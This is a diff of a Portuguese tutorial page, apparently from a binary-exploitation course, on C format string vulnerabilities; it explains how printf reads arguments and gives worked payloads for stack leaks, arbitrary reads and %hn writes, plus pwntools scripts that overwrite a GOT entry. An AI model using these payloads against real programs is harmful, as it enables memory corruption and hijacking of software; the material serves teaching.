@@ -3,300 +3,192 @@ title: "Format Strings"
 sidebar_position: 2
 ---
 
-Em C, as funções `printf`, `fprintf` ou qualquer outras parecidas recebem Format Specifiers e colocam variáveis nos lugares deles para imprimir ao usuário.
+O `printf` não sabe quantos argumentos recebeu. Para cada especificador (`%x`, `%s`, ...) na format string, ele busca o próximo argumento onde a [convenção de chamada](../../extra/call-convention.mdx) diz que ele estaria. Se o argumento não foi passado, ele lê o que estiver lá:
 
-```C
+```c
 int value = 1205;
 
-printf("%x %x %x", value, value, value);
-
-// Saída: 4b5 4b5 4b5
+printf("%x %x %x", value, value, value);   // 4b5 4b5 4b5
+printf("%x %x %x", value);                 // 4b5 5659b000 565981b0  ← lixo de registradores/stack
 ```
 
-Mas e se não tivermos argumentos o suficiente para todos os format specifiers?
+A vulnerabilidade existe quando **o usuário controla a format string**:
 
-```C
-int value = 1205;
-
-printf("%x %x %x", value);
-
-// Saída: 4b5 5659b000 565981b0
-```
-
-O `printf` espera a mesma quantidade de parâmetros que Format Specifiers, e apenas puxa esses parâmetros de onde a convenção de chamada diz que eles estariam (registradores e depois a stack). Ele não tem como saber quantos argumentos realmente foram passados. Se não há parâmetros suficientes, **a função vai pegar os próximos valores mesmo assim, vazando o conteúdo dos registradores e da stack**.
-
-A vulnerabilidade aparece quando **o usuário controla a format string**: `printf(buffer)` em vez de `printf("%s", buffer)`. O mesmo vale para `sprintf`, `fprintf`, `snprintf`, `syslog`, etc.
-
-## Aplicando Format Strings
-
-Temos o seguinte programa em x86:
-
-```C
-#include <stdio.h>
-
-int main(void) {
-    char buffer[30];
-    
-    gets(buffer);
-
-    printf(buffer);
-    return 0;
-}
-```
-
-Input: `%x %x %x %x %x`
-Output: `f7f74080 0 5657b1c0 782573fc 20782520`
-
-```
-────────────────[ STACK ]────────────────
-00:0000│ esp 0xffffcf10 —▸ 0xffffcf28 ◂— '%x %x %x %x %x'
-01:0004│-0e4 0xffffcf14 —▸ 0xf7d843ac ◂— 0x74656e00
-02:0008│-0e0 0xffffcf18 —▸ 0x8048288 ◂— '__libc_start_main'
-03:000c│-0dc 0xffffcf1c —▸ 0x804918c (main+26) ◂— add ebx, 0x2e74
-04:0010│-0d8 0xffffcf20 ◂— 0x7b1ea71
-05:0014│-0d4 0xffffcf24 ◂— 0
-06:0018│-0d0 0xffffcf28 ◂— '%x %x %x %x %x'
-07:001c│-0cc 0xffffcf2c ◂— 'x %x %x %x'
-```
-
-Veja que o que foi vazado foi o **primeiro endereço a partir de esp em diante**: `esp+0x4`, `esp+0x8`,...
-
-Fluxo do printf:
-
-1. printf espera parâmetros após o formato na Stack
-2. O primeiro parâmetro (**format string**) está no **topo da pilha** no momento da chamada
-3. Os parâmetros seguintes (que deveriam ser os valores para %x) **estariam imediatamente após**
-
-Para chamar `printf(buffer)`, o **compilador** precisa:
-
-1. Empurrar os parâmetros na pilha
-2. Chamar a função
-
-Exemplo de preparo de chamada de `printf("%d %d", a, b)`:
-
-```
-; Supondo que buffer esteja em [ebp-30]
-push b  (34)        ← terceiro parâmetro (empilhado primeiro: da direita para a esquerda)
-push a  (99)        ← segundo parâmetro  
-lea eax, [ebp-30]    ; eax recebe endereço do buffer (que contém "%d %d")
-push eax         ← primeiro parâmetro (format string)
-call printf          ; push return address (stack), jump printf (eip)
-```
-
-Após `push b, push a, push eax`, teremos a stack desse jeito:
-
-```
-(endereços altos)
-+------------------+
-| ret. add main    |
-+------------------+
-| ebp salvo        | ← EBP
-+------------------+
-| buffer[29]       | \
-| ...              |  | buffer (variável local)
-| buffer[0]="%d"   | /
-+------------------+ 
-| b                | ← ESP+8 (onde 2º %d vai buscar)
-+------------------+ 
-| a                | ← ESP+4 (onde 1º %d vai buscar)
-+------------------+
-| ponteiro p/ buffer| ← ESP APONTA AQUI! (primeiro parâmetro do printf)
-+------------------+
-(endereços baixos)
-```
-
-Após dar `call printf`, agora estamos no Stack Frame da função `printf`:
-
-```
-(endereços altos)
-+-------------------+ 
-| ...               | ↑
-+-------------------+ 
-| end. retorno main | 
-+-------------------+ 
-| ebp salvo         | ← EBP da main (antes do printf)
-+-------------------+ 
-| buffer[29]        | \
-| ...               |  | Format String ← região local da main (antes do printf)
-| buffer[0]="%x"    | /
-+-------------------+
-| ???               | ← EBP+16 (onde 2º %d vai buscar)
-+-------------------+
-| ???               | ← EBP+12 (onde 1º %d vai buscar)
-+-------------------+ 
-| ponteiro p/ buffer| ← EBP+8 do printf (Format String, 1º Parâmetro do printf)
-+-------------------+ 
-| ret. add printf   | ← EBP+4 do printf
-+-------------------+ 
-| ebp salvo (printf)| ← EBP do printf
-+-------------------+ 
-| vars locais printf| 
-+-------------------+ ← ESP dentro do printf
-(endereços baixos)
-```
-
-Agora imagine que a chamada foi `printf(buffer)`, sem `a` e `b`. O `printf` continua indo buscar o "1º %d" em `EBP+12` e o "2º %d" em `EBP+16`, só que agora o que está lá é o que estava na stack da `main` antes da chamada: lixo, variáveis locais, o próprio buffer...
-
-A vulnerabilidade de format string **pode vazar TODA a região da pilha**, não importa se a variável tem "relação" com o printf ou não. Com `%x` suficientes, lemos desde o topo da stack no momento da chamada até o EBP da `main` (função que chamou `printf`), o endereço de retorno dela e além.
-
-Se pensarmos como blocos, um `printf("%x")` imprime o conteúdo do primeiro bloco depois do ponteiro para a format string, ou seja, `ESP+4` no momento do `call`.
-
-## Diferença entre 32-bit e 64-bit
-
-### x86 (32-bit)
-- Argumentos são passados na **stack**
-- `printf` vai buscar o valor para o 1º `%x` logo depois do ponteiro para a format string, o 2º `%x` logo depois, e assim por diante
-
-Logo após o `call printf` (antes do prólogo do `printf`):
-```
-ESP    → endereço de retorno
-ESP+4  → ponteiro para a format string (1º argumento)
-ESP+8  → onde o 1º %x vai buscar
-ESP+12 → onde o 2º %x vai buscar, etc.
-```
-
-Depois do prólogo do `printf` (`push ebp; mov ebp, esp`), os mesmos valores ficam em `EBP+4`, `EBP+8`, `EBP+12`, `EBP+16`...
-
-Assim, em 32 bits, **o 1º `%x` já é o primeiro valor da stack da função que chamou o `printf`**. Se o buffer é uma variável local dessa função, ele aparece depois de poucos `%x`.
-
-### x86-64 (64-bit)
-
-- Os primeiros argumentos são passados em registradores
-- `printf` vai primeiro olhar nos registradores que armazenam parâmetros (`RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9`)
-- Só depois busca na stack
-
-Lembrando a ordem de passagem de argumentos para registradores:
-
-1. `RDI` (Endereço da Format String)
-2. `RSI`  (Parâmetro 1)
-3. `RDX` (Parâmetro 2)
-4. `RCX` (...)
-5. `R8`
-6. `R9`
-7. Stack (RSP+8, RSP+16, ...)
-
-Se usarmos `printf("%x")`, veremos o que há de conteúdo no registrador `RSI`, que pode ser lixo de memória ou valor usado anteriormente pela função que fez a `call`.
-
-Isso nem sempre é muito útil. Mas se usarmos `printf("%p %p %p %p %p %p %p")`, temos:
-
-```
-%p 1 → RSI (2º registrador)
-%p 2 → RDX (3º registrador)  
-%p 3 → RCX (4º registrador)
-%p 4 → R8  (5º registrador)
-%p 5 → R9  (6º registrador)
-%p 6 → Stack: topo da stack no momento do call  ← AQUI COMEÇA A STACK!
-%p 7 → Stack: próximos 8 bytes
-```
-
-Por isso, em 64 bits, **o 6º parâmetro é sempre o primeiro valor da stack**, e o buffer (se for local da função que chamou o `printf`) costuma aparecer a partir do 6º, 7º, 8º... parâmetro.
-
-Outra diferença importante: em 64 bits, `%x` imprime só 4 bytes (um `int`). Para ver os 8 bytes de um endereço, use `%p` ou `%lx`.
-
-## Tipos de Format Strings
-
-- `%x` - Imprime conteúdo do bloco de memória em hexadecimal (4 bytes). `%p` imprime um ponteiro (8 bytes em 64 bits) com `0x` na frente. `%lx` imprime 8 bytes sem o `0x`.
 ```c
-printf("%x");        // Vaza 4 bytes
-printf("%08x");      // Vaza com padding (8 dígitos)
-printf("%p");        // Vaza um ponteiro inteiro (o mais usado para leaks)
-```
-- `%s` - Imprime string até null byte. Ao receber um bloco da stack como parâmetro, tenta interpretar o conteúdo do bloco como ponteiro, indo até esse endereço e imprimindo o conteúdo como string.
-  - Se argumento for endereço válido - Lê até null byte
-  - Se for endereço inválido - Segmentation fault
-  - Se controlarmos o argumento (colocando um endereço dentro do nosso próprio buffer e apontando para ele com `%N$s`), podemos ler a string de qualquer endereço: **leitura arbitrária**
-```c
-printf("%s", 0x404000);  // Lê string do endereço 0x404000
-printf("%s");            // Tenta ler endereço da stack como ponteiro
-```
-- `%n` - Escreve o número de bytes impressos até agora no endereço dado. Não imprime texto, mas escreve em um endereço de memória: **escrita arbitrária**.
-  - `%n`- Escreve int (4 bytes)
-  - `%hn` - Escreve short (2 bytes)
-  - `%hhn` - Escreve char (1 byte)
-```C
-printf("%100x%n", 0, &var);  // Imprime 100 caracteres e escreve 100 em var
-// (controlando a quantidade de caracteres impressos, você escreve o valor que quiser)
-```
-- `%N$x` / `%N$p` / `%N$s` / `%N$n` - Acesso direto ao N-ésimo parâmetro, sem precisar escrever N format specifiers. Ex: `%7$p` imprime o 7º parâmetro. Essencial para apontar o `%n` para o endereço que colocamos no buffer.
-- `%Nc` / `%Nx` - Largura mínima: `%100c` imprime 100 caracteres (99 espaços + o caractere). É a forma de controlar o contador do `%n` sem precisar enviar 100 bytes de input.
-
-## Exemplo de payload
-
-Os exemplos abaixo são para um binário de 64 bits em que descobrimos que **o início do nosso buffer é o 7º parâmetro** do `printf`.
-
-```
-# 1. Reconhecimento: Onde está nosso input? (procurar os AAAA = 0x41414141 na saída)
-AAAA.%p.%p.%p.%p.%p.%p.%p.%p
-# ou, um de cada vez:
-AAAA%7$p    → se imprimir 0x...41414141, o buffer começa no 7º parâmetro
-
-# 2. Leak de endereços (bypass de PIE/ASLR): endereços da stack (0x7ffd...),
-#    da libc (0x7f...) e do binário aparecem no meio dos valores
-%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
-
-# 3. Arbitrary Read: ler a string que está em 0x404000
-# A format string vem primeiro e o endereço vem depois, alinhado em 8 bytes:
-# "%8$s" + 4 bytes de padding = 8 bytes = parâmetro 7
-# o endereço 0x404000 (8 bytes) = parâmetro 8, por isso o %8$s
-%8$sAAAA\x00\x40\x40\x00\x00\x00\x00\x00
+printf(buffer);          // vulnerável
+printf("%s", buffer);    // correto
 ```
 
-Repare que, em 64 bits, os endereços têm bytes nulos (`\x00`), e o `printf` para de ler a format string no primeiro `\0`. Por isso **os endereços vão no fim do payload**, depois de todos os format specifiers (em 32 bits, `0x0804c00c` não tem byte nulo e o endereço pode vir no começo, como nos tutoriais antigos).
+Vale para toda a família: `fprintf`, `sprintf`, `snprintf`, `dprintf`, `syslog`, `err`, etc. Com isso se obtém leitura da stack, leitura arbitrária (`%s`) e escrita arbitrária (`%n`), sem nenhum overflow.
+
+## De onde o `printf` tira os argumentos
+
+O que importa é saber qual "argumento N" corresponde a qual posição de memória.
+
+### x86 (32 bits)
+
+Todos os argumentos vão na stack. Para `printf(buffer)`, só o ponteiro para a format string foi empilhado, e os "argumentos" seguintes são simplesmente o que vem depois dele: o frame da função que chamou.
+
+<Mem
+  title="Stack no momento do call printf (32 bits)"
+  top="endereços baixos"
+  bottom="endereços altos"
+  rows={[
+    {addr: 'esp', label: 'ponteiro para a format string', kind: 'meta', note: 'argumento 0'},
+    {addr: 'esp+0x4', label: '?', kind: 'ctrl', note: '%1$x'},
+    {addr: 'esp+0x8', label: '?', kind: 'ctrl', note: '%2$x'},
+    {addr: 'esp+0xc', label: '?', kind: 'ctrl', note: '%3$x'},
+    {gap: true},
+    {label: 'buffer (variável local)', kind: 'data', h: 1.4, note: '%N$x: o próprio input'},
+    {label: 'ebp salvo', kind: 'neutral'},
+    {label: 'return address', kind: 'neutral'},
+  ]}
+/>
+
+Exemplo com `gets(buffer); printf(buffer);` e o input `%x %x %x %x %x`:
 
 ```
-# 4. Arbitrary Write: escrever 0xdeadbeef em 0x404020 (uma entrada da GOT, por exemplo)
-# Usamos %hn para escrever 2 bytes de cada vez: 0xbeef em 0x404020 e 0xdead em 0x404022.
-# O %n escreve o total de caracteres impressos até ali, então escrevemos primeiro
-# o menor valor (0xbeef = 48879) e depois completamos até o maior (0xdead = 57005).
-
-%.48863x%11$hn%.8142x%12$hn      # 27 bytes de format string
-AAAAA                            # 5 bytes de padding, para completar 32 bytes = 4 parâmetros (7, 8, 9 e 10)
-\x20\x40\x40\x00\x00\x00\x00\x00   # 11º parâmetro: 0x404020
-\x22\x40\x40\x00\x00\x00\x00\x00   # 12º parâmetro: 0x404022
+f7f74080 0 5657b1c0 782573fc 20782520
 ```
 
-- `%.48863x` imprime 48863 caracteres = `0xbeef`. (O padding e os endereços ficam no fim da string e só são impressos **depois** dos `%hn`, então não entram na conta)
-- `%11$hn`: escreve 2 bytes com o total impresso até agora (`0xbeef`) no endereço do 11º parâmetro (`0x404020`)
-- `%.8142x` imprime mais 8142 caracteres: total 57005 = `0xdead`
-- `%12$hn`: escreve `0xdead` no endereço do 12º parâmetro (`0x404022`)
-- Resultado na memória: `ef be ad de` = `0xdeadbeef` em little endian
+Os dois últimos valores já são o próprio buffer: `25 78 20` é `%x ` em ASCII.
 
-Fazer essa conta na mão é chato e propenso a erro. O pwntools faz isso automaticamente, como veremos abaixo.
+### x86-64
 
-## Arbitrary Write (%) com Pwntools
+Os seis primeiros argumentos vão em registradores, e só depois vem a stack:
 
-O pwntools possui uma função para facilitar o arbitrary write por `%n`, a `fmtstr_payload`, e tende a ser muito mais fácil de utilizar.
+| Especificador | Origem |
+|---|---|
+| (format string) | `rdi` |
+| `%1$p` a `%5$p` | `rsi`, `rdx`, `rcx`, `r8`, `r9` |
+| `%6$p` | `[rsp]` no momento do `call` |
+| `%7$p`, `%8$p`, ... | `[rsp+8]`, `[rsp+0x10]`, ... |
+
+Regra prática: **`%(6 + k)$p` lê `[rsp + 8*k]`**. Para saber o índice de qualquer coisa na stack, pare no `call printf` no GDB, veja a distância até `rsp`, divida por 8 e some 6.
+
+Em 64 bits, `%x` imprime só 4 bytes. Para ver valores inteiros use `%p` ou `%lx`.
+
+## Especificadores
+
+| Especificador | Efeito | Uso |
+|---|---|---|
+| `%p` | Imprime 8 bytes (4 em 32 bits) como ponteiro, com `0x` | Leaks |
+| `%x` / `%lx` | Imprime 4 / 8 bytes em hexadecimal | Leaks |
+| `%s` | Trata o argumento como **ponteiro** e imprime a string que está lá | Leitura arbitrária. Ponteiro inválido = `SIGSEGV` |
+| `%n` | **Escreve** no endereço do argumento a quantidade de caracteres impressos até ali (4 bytes) | Escrita arbitrária |
+| `%hn` / `%hhn` | Como `%n`, mas escreve 2 bytes / 1 byte | Escrita em pedaços |
+| `%N$...` | Usa diretamente o N-ésimo argumento (`%7$p`, `%7$s`, `%7$n`) | Apontar para a posição exata |
+| `%Nc` | Imprime `N` caracteres (preenche com espaços) | Controlar o contador do `%n` |
+
+## Reconhecimento
+
+**1. Confirmar e achar a posição do buffer.** Envie um marcador seguido de `%p`:
+
+```
+AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p
+AAAAAAAA.0x7ffe....0x10.(nil).0x7f....0x4141414141414141.0x70252e70252e7025
+                                             ↑ 6º argumento: o início do buffer
+```
+
+A posição em que aparece `0x4141414141414141` é o **offset** do buffer. Confirme com `AAAAAAAA%6$p`. Se o marcador aparecer cortado entre dois argumentos, o buffer não está alinhado em 8 bytes: acrescente caracteres de padding antes dele.
+
+**2. Identificar os leaks.** Despeje um intervalo (`%1$p` a `%40$p`) e classifique os valores comparando com o `vmmap`:
+
+| Valor | Provavelmente é | Serve para |
+|---|---|---|
+| `0x55...` / `0x56...` (ou `0x40....` sem PIE) | Endereço do binário | Base do PIE |
+| `0x7f...` | libc ou `ld.so` (ex: o retorno da `main` para `__libc_start_call_main`) | Base da libc |
+| `0x7ffc...` / `0x7ffe...` | Stack | Localizar o return address |
+| Termina em `00` e parece aleatório | **Canary** | Bypass do canary |
+
+Os índices são estáveis entre execuções: ache uma vez no GDB qual `%N$p` é o canary ou o endereço da libc, e use esse índice no exploit.
+
+## Leitura arbitrária
+
+Colocamos um endereço dentro do nosso buffer e usamos `%N$s` para que o `printf` o trate como ponteiro. Em 64 bits com o buffer no offset 6:
+
+```py
+payload  = b'%7$sAAAA'           # 8 bytes: ocupa o argumento 6
+payload += p64(0x404000)         # argumento 7: o endereço a ler
+```
+
+O endereço fica **depois** dos especificadores porque, em 64 bits, endereços contêm bytes nulos e o `printf` para de processar a format string no primeiro `\0`. Em 32 bits (`0x0804c00c` não tem byte nulo), o endereço pode vir no começo, como nos tutoriais antigos.
+
+O `%s` lê até encontrar um `\0`. Para ler um ponteiro (uma entrada da GOT, por exemplo), pegue os bytes recebidos e complete com `ljust(8, b'\0')` antes do `u64`.
+
+## Escrita arbitrária
+
+O `%n` grava o **número de caracteres impressos até aquele ponto**. Para escrever um valor, imprimimos essa quantidade de caracteres com `%Nc` e apontamos o `%n` para o endereço alvo. Como imprimir `0x7fff...` caracteres é inviável, escreve-se em pedaços de 2 bytes (`%hn`) ou 1 byte (`%hhn`), um endereço por pedaço.
+
+Exemplo: escrever `0xdeadbeef` em `0x404020`, buffer no offset 6.
+
+<Mem
+  title="Payload na stack: format string primeiro, endereços no fim"
+  rows={[
+    {addr: 'arg 6 a 9', label: '%48879c%10$hn%8126c%11$hn + padding', kind: 'ctrl', note: '32 bytes = 4 argumentos'},
+    {addr: 'arg 10', label: 'p64(0x404020)', kind: 'ptr', note: 'recebe 0xbeef'},
+    {addr: 'arg 11', label: 'p64(0x404022)', kind: 'ptr', note: 'recebe 0xdead'},
+  ]}
+  cellW={330}
+/>
+
+1. `%48879c` imprime 48879 caracteres. Contador = `0xbeef`.
+2. `%10$hn` grava `0xbeef` (2 bytes) no endereço do argumento 10.
+3. `%8126c` imprime mais 8126. Contador = 57005 = `0xdead`.
+4. `%11$hn` grava `0xdead` em `0x404022`.
+5. Memória: `ef be ad de` = `0xdeadbeef`.
+
+Detalhes que fazem isso dar errado quando feito à mão:
+
+- O contador só cresce, então os pedaços são escritos **em ordem crescente de valor** (não de endereço). Para "diminuir", use o overflow do pedaço: com `%hhn`, imprimir mais `0x100 - atual + desejado` caracteres dá a volta.
+- A format string precisa ocupar um múltiplo de 8 bytes (4 em 32 bits) para os endereços caírem exatamente em um argumento. Mudar a string muda quantos argumentos ela ocupa, e portanto os índices.
+- Tudo o que é impresso antes do `%n` conta, inclusive texto fixo que o programa imprima na mesma chamada.
+
+### Com pwntools
+
+O `fmtstr_payload` faz toda essa conta:
 
 ```py
 from pwn import *
 
-context.binary = elf = ELF('./vuln')
+context.binary = elf = ELF('./vuln')    # necessário: define 32/64 bits
 p = process()
 
-offset = 7  # Posição onde o buffer começa nos argumentos do printf
-# Descubra enviando "AAAA%7$p" (ou AAAA.%p.%p.%p...) e vendo em qual posição aparece 0x41414141
-
-writes = {
-    elf.got['puts']: elf.sym['win']  # {endereço_alvo: novo_valor}
-}
-
-# Gera e envia o payload (os endereços já vão no fim, alinhados)
-payload = fmtstr_payload(offset, writes)
+offset = 6                               # posição do buffer
+payload = fmtstr_payload(offset, {elf.got['puts']: elf.sym['win']})
 p.sendline(payload)
 p.interactive()
 ```
 
-Se o offset for difícil de achar na mão, a classe `FmtStr` descobre sozinha:
+Parâmetros úteis: `write_size='short'` (usa `%hn`, payload menor que o padrão `'byte'`) e `numbwritten=N` (caracteres já impressos antes do nosso input na mesma chamada).
+
+A classe `FmtStr` descobre o offset sozinha, dado um jeito de enviar um payload e receber a resposta:
 
 ```py
 def send_fmt(payload):
     p.sendline(payload)
-    return p.recvline()   # precisa devolver a saída do printf
+    return p.recvline()
 
 fmt = FmtStr(execute_fmt=send_fmt)
-print(fmt.offset)                        # offset encontrado automaticamente
+print(fmt.offset)
 fmt.write(elf.got['puts'], elf.sym['win'])
 fmt.execute_writes()
 ```
 
-Veja um exemplo completo em [GOT Overwrite](./got-overwrite.md).
+## O que sobrescrever
+
+| Alvo | Condição |
+|---|---|
+| Entrada da GOT ([GOT Overwrite](./got-overwrite.md)) | Sem Full RELRO |
+| Return address na stack | Leak de stack para saber onde ele está |
+| `.fini_array` (chamado na saída do programa) | Sem RELRO |
+| `__malloc_hook` / `__free_hook` | glibc < 2.34. Um `printf` com saída grande chama `malloc` |
+| Variável do programa (`is_admin`, contador de tentativas) | Endereço conhecido |
+
+Se o programa chama `printf` uma única vez, o primeiro passo costuma ser ganhar mais chamadas: sobrescrever uma entrada da GOT (ou `.fini_array`) com o endereço da `main` ou da função vulnerável.
+
+## Limitações
+
+- **`fgets`/`read` com tamanho pequeno**: o payload precisa caber. `write_size='short'` e escrever em mais de uma rodada ajudam.
+- **[Fortify](../protections.mdx#fortify-source)**: `__printf_chk` bloqueia `%n` e `%N$`. Leaks com `%p` em sequência continuam possíveis.
+- **Buffer fora da stack** (heap ou `.bss`): você não consegue colocar endereços entre os argumentos. A saída é usar ponteiros que **já estão** na stack e apontam para outras posições da stack (cadeia de `rbp` salvos, `argv`) para construir o endereço em duas etapas.
